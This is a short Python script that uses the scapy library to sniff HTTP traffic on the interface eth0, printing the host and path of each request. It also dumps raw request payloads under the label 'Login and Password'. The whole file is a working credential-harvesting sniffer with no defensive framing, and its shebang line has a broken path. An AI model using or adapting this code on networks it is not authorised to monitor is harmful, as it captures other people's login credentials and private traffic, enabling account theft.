#!/us/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffered_packets_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_passwd(packet):
    return packet[scapy.Raw].load

def sniffered_packets_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request   ==> " + str(url))
        if packet.haslayer(scapy.Raw):
            lp = get_login_passwd(packet)
            print("[+] Login and Password   ==> " + str(lp))
print(sniff("eth0"))
